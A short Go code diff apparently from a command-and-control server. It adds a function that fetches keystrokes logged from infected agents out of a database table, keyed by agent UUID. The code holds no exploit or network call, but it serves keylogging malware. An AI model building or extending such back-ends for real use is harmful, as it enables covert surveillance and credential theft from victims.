@@ -315,3 +315,30 @@ func Agent(uuid string) []types.Agent {
 	// logger.Logf(logger.Info, "Agent %s Fetched Next Command %s \n", agentStruct.UpdateAgentConfig.Uuid, agentStruct.Command)
 	// return agentStruct
 }
+
+func Keylog(uuid string) []types.KeyReceive {
+	var info types.KeyReceive
+	FetchSQL := `
+	SELECT 
+		UUID, 
+		Keys
+	FROM Keylog
+	WHERE UUID= ?
+	`
+	row, err := db.Query(FetchSQL, uuid)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer row.Close()
+	var infoAppend []types.KeyReceive
+	for row.Next() {
+		row.Scan(
+			&info.Uuid,
+			&info.Keys,
+		)
+		infoAppend = append(infoAppend, info)
+	}
+	return infoAppend
+	// logger.Logf(logger.Info, "Agent %s Fetched Next Command %s \n", agentStruct.UpdateAgentConfig.Uuid, agentStruct.Command)
+	// return agentStruct
+}
